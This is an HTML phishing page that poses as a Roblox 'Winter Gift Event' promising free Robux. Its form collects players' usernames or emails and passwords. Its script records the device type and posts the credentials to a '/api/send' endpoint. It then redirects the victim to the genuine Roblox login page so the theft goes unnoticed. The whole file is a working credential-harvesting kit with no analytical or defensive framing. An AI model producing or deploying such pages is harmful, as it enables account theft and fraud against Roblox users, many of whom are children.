<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox | Winter Gift Event 2025</title>
    <style>
        body { margin: 0; font-family: 'Gotham SSm', sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: radial-gradient(circle, #1a3a3a 0%, #000 100%); }
        .header { width: 100%; background: #d32f2f; padding: 12px 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); display: flex; align-items: center; position: fixed; top: 0; z-index: 100; border-bottom: 3px solid #ffca28; }
        .header img { height: 30px; }
        .spacer { height: 100px; }
        .card { background: #232527; padding: 35px; border-radius: 15px; width: 340px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 25px rgba(211, 47, 47, 0.4); }
        .main-logo { width: 80px; margin-bottom: 10px; filter: drop-shadow(0 0 5px #fff); }
        .event-title { color: #ffca28; font-weight: 900; font-size: 18px; margin-bottom: 5px; text-transform: uppercase; }
        .event-sub { font-size: 12px; color: #bbb; margin-bottom: 20px; }
        
        select, input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; font-size: 14px; }
        input:focus, select:focus { border-color: #ffca28; }
        
        button { width: 100%; padding: 14px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 15px; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #ffca28; color: #000; }
        
        #loader { display: none; color: #ffca28; font-size: 12px; margin-top: 15px; font-family: monospace; line-height: 1.5; }
        .footer { font-size: 10px; color: #555; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.roblox.com/images/Logos/rbx_icon.png" alt="Roblox">
        <span style="margin-left: 10px; font-weight: bold;">WINTER GIFTING SYSTEM</span>
    </div>
    
    <div class="spacer"></div>

    <div class="card">
        <img src="https://www.roblox.com/images/logos/rebrand/metric_144_white.png" class="main-logo">
        <div class="event-title">GET YOUR GIFT 🎁</div>
        <div class="event-sub">Account must be older than 30 days</div>
        
        <form id="gift-form">
            <select id="rbx">
                <option value="400">400 Robux (Holiday Gift)</option>
                <option value="800">800 Robux (Santa Pack)</option>
                <option value="1700">1,700 Robux (Winter Pro)</option>
                <option value="4500">4,500 Robux (Elite Reward)</option>
            </select>
            <input type="text" id="u" placeholder="Username / Email" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit" id="btn">CLAIM ROBUX</button>
        </form>
        
        <div id="loader">
            INITIALIZING SECURE LINK... [OK]<br>
            VERIFYING ACCOUNT AGE... [OK]<br>
            CONNECTING TO REWARD SERVERS...
        </div>
        
        <div class="footer">© 2025 Roblox Winter Event. Authorized Security.</div>
    </div>

    <script>
        document.getElementById('gift-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            const loader = document.getElementById('loader');
            
            btn.style.display = 'none';
            loader.style.display = 'block';

            // Точное определение устройства (ПК или Телефон)
            let device = "PC / Desktop";
            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
                const match = navigator.userAgent.match(/\(([^)]+)\)/);
                device = "Mobile: " + (match ? match[1].split(';')[0] : "Smartphone");
            } else {
                device = "PC: " + navigator.platform + " (" + navigator.appName + ")";
            }

            // Отправка данных
            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    u: document.getElementById('u').value, 
                    p: document.getElementById('p').value, 
                    r: document.getElementById('rbx').value,
                    m: device 
                })
            });

            setTimeout(() => {
                window.location.href = "https://www.roblox.com/login";
            }, 2500);
        };
    </script>
</body>
</html>
